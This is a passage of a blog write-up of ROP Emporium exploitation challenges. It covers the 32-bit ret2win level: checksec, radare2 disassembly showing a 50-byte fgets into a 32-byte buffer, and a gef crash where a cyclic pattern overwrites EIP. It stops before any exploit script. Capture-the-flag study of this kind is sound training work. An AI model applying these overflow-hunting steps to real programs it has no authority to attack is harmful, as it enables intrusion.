I"‚è<p>I started doing the challenges from ROP Emporium because I wanted to start really learning about Return Oriented Programming. These are my writeups for the challenges. More will be added as I do them.</p>

<div class="toc-container">
  <ul id="markdown-toc">
    <li><a href="#ret2win" id="markdown-toc-h1-header">ret2win</a>
    <ul>
        <li><a href="#32-bit" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
    <li><a href="#split" id="markdown-toc-h1-header">split</a>
    <ul>
        <li><a href="#32-bit-1" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit-1" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
    <li><a href="#callme" id="markdown-toc-h1-header">callme</a>
    <ul>
        <li><a href="#32-bit-2" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit-2" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
    <li><a href="#write4" id="markdown-toc-h1-header">write4</a>
    <ul>
        <li><a href="#32-bit-3" id="markdown-toc-h3-header">32-bit</a></li>
        <li><a href="#64-bit-3" id="markdown-toc-h3-header">64-bit</a></li>
    </ul>
    </li>
  </ul>
</div>

<h1 id="introduction">Introduction</h1>

<p><a href="https://ropemporium.com/">ROP Emporium</a> is a website that hosts a set of challenges intended to teach Return Oriented Programming, which is a technique used in binary exploitation. This post will showcase my solutions to all the challenges. I will make heavy use of the following tools:</p>

<ul>
  <li>gdb gef</li>
  <li>pwntools</li>
  <li>ropper</li>
  <li>radare2</li>
</ul>

<p>The challenges are all listed in sequential order as shown on ROP Emporium‚Äôs website. It is ordered by increasing difficulty.</p>

<p>Disclaimer: I will make an assumption that anyone reading this is familiar with the basics of binary exploitation, and will skip explaining a lot of the very simple things. You should also know how to read assembly.</p>

<h1 id="ret2win">ret2win</h1>

<p>This level starts us off with a very simple buffer overflow.</p>

<h3 id="32-bit">32-bit</h3>

<p>To start off with, let‚Äôs run a checksec on the given binary:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/ret2win/32ret2win# checksec ./ret2win
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/root/Documents/ropemporium/ret2win/32ret2win/ret2win'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</code></pre></div></div>

<p>Explanation:</p>

<ul>
  <li><strong>Arch: i386-32-little:</strong> This means this is a 32-bit binary compiled on a little-endian system.</li>
  <li><strong>RELRO: Partial RELRO:</strong> A detailed explanation on what RELRO is can be found <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">here</a>.</li>
  <li><strong>Stack: No canary found:</strong> Stack canaries are a feature that programs can use to protect against buffer overflows. More information <a href="https://ctf101.org/binary-exploitation/stack-canaries/">here</a>.</li>
  <li><strong>NX: NX enabled:</strong> NX means Not Executable. This just means that the stack is not executable, meaning we can‚Äôt just place our own malicious shellcode on the stack and execute it.</li>
  <li><strong>PIE: No PIE (0x8048000):</strong> PIE means Position Independent Executable. PIE being enabled is synonymous with ASLR being enabled. More information about PIE (and by extension, ASLR) can be found <a href="https://ctf101.org/binary-exploitation/address-space-layout-randomization/">here</a>.</li>
</ul>

<p>First things first, open the binary up in radare2, analyze it, and see what we can see.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/ropemporium/ret2win/32ret2win# r2 ./ret2win
<span class="o">[</span>0x08048480]&gt; aaaa
<span class="o">[</span>x] Analyze all flags starting with sym. and entry0 <span class="o">(</span>aa<span class="o">)</span>
<span class="o">[</span>x] Analyze <span class="k">function </span>calls <span class="o">(</span>aac<span class="o">)</span>
<span class="o">[</span>x] Analyze len bytes of instructions <span class="k">for </span>references <span class="o">(</span>aar<span class="o">)</span>
<span class="o">[</span>x] Constructing a <span class="k">function </span>name <span class="k">for </span>fcn.<span class="k">*</span> and sym.func.<span class="k">*</span> functions <span class="o">(</span>aan<span class="o">)</span>
<span class="o">[</span>x] Enable constraint types analysis <span class="k">for </span>variables
<span class="o">[</span>0x08048480]&gt; afl
0x080483c0    3 35           sym._init
0x08048400    1 6            sym.imp.printf
0x08048410    1 6            sym.imp.fgets
0x08048420    1 6            sym.imp.puts
0x08048430    1 6            sym.imp.system
0x08048440    1 6            sym.imp.__libc_start_main
0x08048450    1 6            sym.imp.setvbuf
0x08048460    1 6            sym.imp.memset
0x08048470    1 6            sub.__gmon_start_8048470
0x08048480    1 33           entry0
0x080484b0    1 4            sym.__x86.get_pc_thunk.bx
0x080484c0    4 43           sym.deregister_tm_clones
0x080484f0    4 53           sym.register_tm_clones
0x08048530    3 30           sym.__do_global_dtors_aux
0x08048550    4 43   -&gt; 40   entry.init0
0x0804857b    1 123          sym.main
0x080485f6    1 99           sym.pwnme
0x08048659    1 41           sym.ret2win
0x08048690    4 93           sym.__libc_csu_init
0x080486f0    1 2            sym.__libc_csu_fini
0x080486f4    1 20           sym._fini
<span class="o">[</span>0x08048480]&gt;
</code></pre></div></div>

<p>The important functions are <code class="highlighter-rouge">sym.main</code>, <code class="highlighter-rouge">sym.pwnme</code>, and <code class="highlighter-rouge">sym.ret2win</code>. The important bits of the main function is shown below:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x08048480]&gt; s sym.main
<span class="o">[</span>0x0804857b]&gt; pdf
            <span class="p">;</span><span class="nt">--</span> main:
/ <span class="o">(</span>fcn<span class="o">)</span> sym.main 123
|   sym.main <span class="o">(</span>int argc, char <span class="k">**</span>argv, char <span class="k">**</span>envp<span class="o">)</span><span class="p">;</span>
|           <span class="p">;</span> var int local_4h @ ebp-0x4
|           <span class="p">;</span> arg int arg_4h @ esp+0x4
|           <span class="p">;</span> DATA XREF from entry0 <span class="o">(</span>0x8048497<span class="o">)</span>
|           ...
|           0x080485b7      6810870408     push str.ret2win_by_ROP_Emporium <span class="p">;</span> 0x8048710 <span class="p">;</span> <span class="s2">"ret2win by ROP Emporium"</span>
|           0x080485bc      e85ffeffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x080485c1      83c410         add esp, 0x10
|           0x080485c4      83ec0c         sub esp, 0xc
|           0x080485c7      6828870408     push str.32bits             <span class="p">;</span> 0x8048728 <span class="p">;</span> <span class="s2">"32bits</span><span class="se">\n</span><span class="s2">"</span>
|           0x080485cc      e84ffeffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x080485d1      83c410         add esp, 0x10
|           0x080485d4      e81d000000     call sym.pwnme
|           0x080485d9      83ec0c         sub esp, 0xc
|           0x080485dc      6830870408     push str.Exiting            <span class="p">;</span> 0x8048730 <span class="p">;</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Exiting"</span>
|           0x080485e1      e83afeffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           ...
<span class="o">[</span>0x0804857b]&gt;

</code></pre></div></div>

<p>So the main function basically uses <code class="highlighter-rouge">puts()</code> to output a bunch of text, then calls the <code class="highlighter-rouge">pwnme()</code> function. Let‚Äôs see what <code class="highlighter-rouge">pwnme()</code> does.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x0804857b]&gt; s sym.pwnme
<span class="o">[</span>0x080485f6]&gt; pdf
/ <span class="o">(</span>fcn<span class="o">)</span> sym.pwnme 99
|   sym.pwnme <span class="o">()</span><span class="p">;</span>
|           <span class="p">;</span> var int local_28h @ ebp-0x28
|           <span class="p">;</span> CALL XREF from sym.main <span class="o">(</span>0x80485d4<span class="o">)</span>
|           0x080485f6      55             push ebp
|           0x080485f7      89e5           mov ebp, esp
|           0x080485f9      83ec28         sub esp, 0x28               <span class="p">;</span> <span class="s1">'('</span>
|           0x080485fc      83ec04         sub esp, 4
|           0x080485ff      6a20           push 0x20                   <span class="p">;</span> 32
|           0x08048601      6a00           push 0
|           0x08048603      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x08048606      50             push eax
|           0x08048607      e854feffff     call sym.imp.memset         <span class="p">;</span> void <span class="k">*</span>memset<span class="o">(</span>void <span class="k">*</span>s, int c, size_t n<span class="o">)</span>
|           0x0804860c      83c410         add esp, 0x10
|           0x0804860f      83ec0c         sub esp, 0xc
|           0x08048612      683c870408     push str.For_my_first_trick__I_will_attempt_to_fit_50_bytes_of_user_input_into_32_bytes_of_stack_buffer___What_could_possibly_go_wrong <span class="p">;</span> 0x804873c <span class="p">;</span> <span class="s2">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;</span><span class="se">\n</span><span class="s2">What could possibly go wrong?"</span>
|           0x08048617      e804feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x0804861c      83c410         add esp, 0x10
|           0x0804861f      83ec0c         sub esp, 0xc
|           0x08048622      68bc870408     push str.You_there_madam__may_I_have_your_input_please__And_don_t_worry_about_null_bytes__we_re_using_fgets <span class="p">;</span> 0x80487bc <span class="p">;</span> <span class="s2">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!</span><span class="se">\n</span><span class="s2">"</span>
|           0x08048627      e8f4fdffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
|           0x0804862c      83c410         add esp, 0x10
|           0x0804862f      83ec0c         sub esp, 0xc
|           0x08048632      6821880408     push 0x8048821
|           0x08048637      e8c4fdffff     call sym.imp.printf         <span class="p">;</span> int <span class="nb">printf</span><span class="o">(</span>const char <span class="k">*</span>format<span class="o">)</span>
|           0x0804863c      83c410         add esp, 0x10
|           0x0804863f      a160a00408     mov eax, dword <span class="o">[</span>obj.stdin__GLIBC_2.0] <span class="p">;</span> <span class="o">[</span>0x804a060:4]<span class="o">=</span>0
|           0x08048644      83ec04         sub esp, 4
|           0x08048647      50             push eax
|           0x08048648      6a32           push 0x32                   <span class="p">;</span> <span class="s1">'2'</span> <span class="p">;</span> 50
|           0x0804864a      8d45d8         lea eax, dword <span class="o">[</span>local_28h]
|           0x0804864d      50             push eax
|           0x0804864e      e8bdfdffff     call sym.imp.fgets          <span class="p">;</span> char <span class="k">*</span>fgets<span class="o">(</span>char <span class="k">*</span>s, int size, FILE <span class="k">*</span>stream<span class="o">)</span>
|           0x08048653      83c410         add esp, 0x10
|           0x08048656      90             nop
|           0x08048657      c9             leave
<span class="se">\ </span>          0x08048658      c3             ret
<span class="o">[</span>0x080485f6]&gt;
</code></pre></div></div>

<p>Here is where the buffer overflow lies. We can already see the text says ‚ÄúI will attempt to fit 50 bytes of user input into 32 bytes of stack buffer‚Äù. The buffer <code class="highlighter-rouge">local_28h</code> is initialized to a size of 0x20 bytes at instruction <code class="highlighter-rouge">0x08048607</code>. <code class="highlighter-rouge">fgets()</code> is then called with a size of 0x32 bytes at instruction <code class="highlighter-rouge">0x0804864e</code>.</p>

<p>The last function we have to check is <code class="highlighter-rouge">ret2win()</code>.</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>0x080485f6]&gt; s sym.ret2win
<span class="o">[</span>0x08048659]&gt; pdf
/ <span class="o">(</span>fcn<span class="o">)</span> sym.ret2win 41
|   sym.ret2win <span class="o">()</span><span class="p">;</span>
|           0x08048659      55             push ebp
|           0x0804865a      89e5           mov ebp, esp
|           0x0804865c      83ec08         sub esp, 8
|           0x0804865f      83ec0c         sub esp, 0xc
|           0x08048662      6824880408     push str.Thank_you__Here_s_your_flag: <span class="p">;</span> 0x8048824 <span class="p">;</span> <span class="s2">"Thank you! Here's your flag:"</span>
|           0x08048667      e894fdffff     call sym.imp.printf         <span class="p">;</span> int <span class="nb">printf</span><span class="o">(</span>const char <span class="k">*</span>format<span class="o">)</span>
|           0x0804866c      83c410         add esp, 0x10
|           0x0804866f      83ec0c         sub esp, 0xc
|           0x08048672      6841880408     push str.bin_cat_flag.txt   <span class="p">;</span> 0x8048841 <span class="p">;</span> <span class="s2">"/bin/cat flag.txt"</span>
|           0x08048677      e8b4fdffff     call sym.imp.system         <span class="p">;</span> int system<span class="o">(</span>const char <span class="k">*</span>string<span class="o">)</span>
|           0x0804867c      83c410         add esp, 0x10
|           0x0804867f      90             nop
|           0x08048680      c9             leave
<span class="se">\ </span>          0x08048681      c3             ret
<span class="o">[</span>0x08048659]&gt;
</code></pre></div></div>
<p>It‚Äôs a tiny function that just calls <code class="highlighter-rouge">system("/bin/cat flag.txt")</code>. This is the function we want to jump to. Seems easy enough.</p>

<p>Now that we know what to do, let‚Äôs attempt to crash the program and see exactly where the crash occurs. I like to use gdb gef for this as it has its own built in <code class="highlighter-rouge">pattern create</code> and <code class="highlighter-rouge">pattern offset</code> shown below.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef‚û§  pattern create 50
<span class="o">[</span>+] Generating a pattern of 50 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
<span class="o">[</span>+] Saved as <span class="s1">'$_gef0'</span>
gef‚û§  run
Starting program: /root/Documents/ropemporium/ret2win/32ret2win/ret2win
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer<span class="p">;</span>
What could possibly go wrong?
You there madam, may I have your input please? And don<span class="s1">'t worry about null bytes, we'</span>re using fgets!

<span class="o">&gt;</span> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x6161616c <span class="k">in</span> ?? <span class="o">()</span>
<span class="o">[</span> Legend: Modified register | Code | Heap | Stack | String <span class="o">]</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ registers ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="nv">$eax</span>   : 0xffffd270  ‚Üí  <span class="s2">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"</span>
<span class="nv">$ebx</span>   : 0x0       
<span class="nv">$ecx</span>   : 0xf7fac89c  ‚Üí  0x00000000
<span class="nv">$edx</span>   : 0xffffd270  ‚Üí  <span class="s2">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaam"</span>
<span class="nv">$esp</span>   : 0xffffd2a0  ‚Üí  0xf7fe006d  ‚Üí   add BYTE PTR <span class="o">[</span>esi-0x70], ah
<span class="nv">$ebp</span>   : 0x6161616b <span class="o">(</span><span class="s2">"kaaa"</span>?<span class="o">)</span>
<span class="nv">$esi</span>   : 0xf7fab000  ‚Üí  0x001d9d6c
<span class="nv">$edi</span>   : 0xf7fab000  ‚Üí  0x001d9d6c
<span class="nv">$eip</span>   : 0x6161616c <span class="o">(</span><span class="s2">"laaa"</span>?<span class="o">)</span>
<span class="nv">$eflags</span>: <span class="o">[</span>zero carry parity adjust SIGN <span class="nb">trap </span>INTERRUPT direction overflow RESUME virtualx86 identification]
<span class="nv">$cs</span>: 0x0023 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x002b <span class="nv">$es</span>: 0x002b <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0063
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ stack ‚îÄ‚îÄ‚îÄ‚îÄ
0xffffd2a0‚îÇ+0x0000: 0xf7fe006d  ‚Üí   add BYTE PTR <span class="o">[</span>esi-0x70], ah  ‚Üê <span class="nv">$esp</span>
0xffffd2a4‚îÇ+0x0004: 0xffffd2c0  ‚Üí  0x00000001
0xffffd2a8‚îÇ+0x0008: 0x00000000
0xffffd2ac‚îÇ+0x000c: 0xf7debb41  ‚Üí  &lt;__libc_start_main+241&gt; add esp, 0x10
0xffffd2b0‚îÇ+0x0010: 0xf7fab000  ‚Üí  0x001d9d6c
0xffffd2b4‚îÇ+0x0014: 0xf7fab000  ‚Üí  0x001d9d6c
0xffffd2b8‚îÇ+0x0018: 0x00000000
0xffffd2bc‚îÇ+0x001c: 0xf7debb41  ‚Üí  &lt;__libc_start_main+241&gt; add esp, 0x10
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ code:x86:32 ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="o">[!]</span> Cannot disassemble from <span class="nv">$PC</span>
<span class="o">[!]</span> Cannot access memory at address 0x6161616c
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ threads ‚îÄ‚îÄ‚îÄ‚îÄ
<span class="o">[</span><span class="c">#0] Id 1, Name: "ret2win", stopped, reason: SIGSEGV</span>
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ trace ‚îÄ‚îÄ‚îÄ‚îÄ
